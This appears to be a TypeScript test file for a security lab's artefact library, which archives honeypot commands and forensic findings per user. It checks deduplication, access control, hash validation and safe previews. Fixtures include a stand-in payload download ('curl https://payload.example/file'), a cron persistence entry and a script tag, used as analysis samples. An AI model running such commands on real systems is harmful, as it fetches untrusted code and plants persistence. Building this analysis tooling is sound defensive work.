import { beforeEach, describe, expect, it, vi } from 'vitest';
import Fastify from 'fastify';
import { hashArtefato, analisarArtefato, validarAmostra, previaAmostra } from './artefatosAnalise.js';

const db = vi.hoisted(() => ({
  itens: new Map<string, any>(), ocorrencias: new Map<string, any>(),
  count: vi.fn(async () => 0), findMany: vi.fn(async () => []), findFirst: vi.fn(async () => null), updateMany: vi.fn(async () => ({ count: 0 })),
}));
vi.mock('./db.js', () => ({ prisma: {
  artefatoAtaque: {
    upsert: async ({ where, create }: any) => {
      const k = JSON.stringify(where.usuarioId_chave); const atual = db.itens.get(k);
      if (atual) return atual;
      const item = { id: `a${db.itens.size}`, ...create }; db.itens.set(k, item); return item;
    }, count: db.count, findMany: db.findMany, findFirst: db.findFirst, updateMany: db.updateMany,
  },
  artefatoOcorrencia: { upsert: async ({ where, create }: any) => { db.ocorrencias.set(JSON.stringify(where), create); } },
} }));
import { preservarEventos, preservarPericia } from './artefatosCaptura.js';
import { registerArtefatosRoutes, guardarAmostra } from './artefatos.js';
import { PericiaInSchema } from '@seginfo/shared';

beforeEach(() => { db.itens.clear(); db.ocorrencias.clear(); vi.clearAllMocks(); });

describe('biblioteca permanente', () => {
  it('não arquiva comandos de produção automaticamente na biblioteca do laboratório', async () => {
    await preservarEventos([{ usuarioId: 'u1', dedupKey: 'prod', fonte: 'wazuh', ambiente: 'producao', ocorridoEm: new Date(), acao: 'comando', detalhes: { comando: 'conteudo privado' } }]);
    expect(db.itens.size).toBe(0);
  });
  it('deduplica comandos e preserva cada contexto, sem misturar usuários', async () => {
    const evento = { usuarioId: 'u1', dedupKey: 'evento-1', fonte: 'cowrie', ocorridoEm: new Date(), acao: 'comando', detalhes: { comando: 'uname -a', sessao: 'sessao-1' } };
    await preservarEventos([evento, evento, { ...evento, dedupKey: 'evento-2' }, { ...evento, usuarioId: 'u2' }]);
    expect(db.itens.size).toBe(2); expect(db.ocorrencias.size).toBe(3);
    expect([...db.ocorrencias.values()][0].sessao).toBe('sessao-1');
    expect([...db.itens.values()][0].conteudo).toBe('uname -a');
  });
  it('preserva arquivos, trechos e processos mesmo se o laudo for reenviado', async () => {
    const laudo = PericiaInSchema.parse({ alvo: 'alvo.example', vmid: 999, sistema: 'linux', janelaInicio: '2026-11-14T00:00:00Z', janelaFim: '2026-11-14T06:00:00Z',
      arquivos: [{ caminho: '/tmp/amostra', tamanho: 3, tipo: 'elf', executavel: true, sha256: 'a'.repeat(64) }], persistencia: [{ tipo: 'cron', onde: '/etc/crontab', conteudo: '* * * * * /tmp/amostra' }], processos: [{ pid: 123, comando: '/tmp/amostra' }] });
    await preservarPericia('u1', 'p1', laudo); await preservarPericia('u1', 'p1', laudo);
    expect(db.itens.size).toBe(3); expect(db.ocorrencias.size).toBe(3);
  });
  it('verifica os bytes recebidos, recusando hash divergente e base64 inválido', () => {
    const dados = Buffer.from('conteudo para estudo'); const sha = hashArtefato(dados);
    expect(validarAmostra(dados.toString('base64'), sha)).toEqual(dados);
    expect(() => validarAmostra(dados.toString('base64'), '0'.repeat(64))).toThrow('SHA-256');
    expect(() => validarAmostra('###', sha)).toThrow();
  });
  it('expõe binários como hex e strings, sem interpretar conteúdo ativo', () => {
    const dados = Buffer.from('\x7fELF\x00abcdef<script>alert(1)</script>');
    const previa = previaAmostra(dados);
    expect(previa.modo).toBe('strings'); expect(previa.texto).toContain('7f454c46'); expect(previa.texto).toContain('<script>');
  });
  it('aceita o limite de 8 MB e recusa uma amostra maior', () => {
    const bytes = Buffer.alloc(8 * 1048576, 65);
    expect(validarAmostra(bytes.toString('base64'), hashArtefato(bytes)).length).toBe(bytes.length);
    const maior = Buffer.alloc(bytes.length + 1, 65);
    expect(() => validarAmostra(maior.toString('base64'), hashArtefato(maior))).toThrow();
  });
  it('reconhece várias intenções sem afirmar sucesso da transferência', () => {
    const r = analisarArtefato('curl https://payload.example/file; crontab -l');
    expect(r.categoria).toBe('persistencia'); expect(r.resumo).toContain('transferência terminou');
  });
  it('lista sem incluir blobs e filtra pelo usuário autenticado', async () => {
    const app = Fastify(); app.addHook('preHandler', async (req) => { (req as any).usuarioId = 'u1'; });
    await registerArtefatosRoutes(app);
    expect((await app.inject('/api/artefatos?q=uname&tipo=comando')).statusCode).toBe(200);
    expect(db.findMany).toHaveBeenCalledWith(expect.objectContaining({ where: expect.objectContaining({ usuarioId: 'u1', tipo: 'comando' }), select: expect.not.objectContaining({ amostraBase64: true }) }));
    await app.close();
  });
  it('não deixa editar ou baixar um artefato de outro usuário', async () => {
    const app = Fastify(); app.addHook('preHandler', async (req) => { (req as any).usuarioId = 'u2'; }); await registerArtefatosRoutes(app);
    const edit = await app.inject({ method: 'PATCH', url: '/api/artefatos/alheio', payload: { notas: 'alterar' } });
    const download = await app.inject('/api/artefatos/alheio/amostra');
    expect(edit.statusCode).toBe(404); expect(download.statusCode).toBe(404);
    expect(db.updateMany).toHaveBeenCalledWith(expect.objectContaining({ where: { id: 'alheio', usuarioId: 'u2' } }));
    expect(db.findFirst).toHaveBeenCalledWith(expect.objectContaining({ where: { id: 'alheio', usuarioId: 'u2' } })); await app.close();
  });
  it('preserva notas pessoais durante o anexo de amostra', async () => {
    const conteudo = Buffer.from('#!/bin/sh\nuname -a');
    await guardarAmostra('u1', hashArtefato(conteudo), conteudo.toString('base64'));
    expect(db.updateMany).toHaveBeenCalledWith(expect.objectContaining({ data: expect.not.objectContaining({ notas: expect.anything() }) }));
  });
});
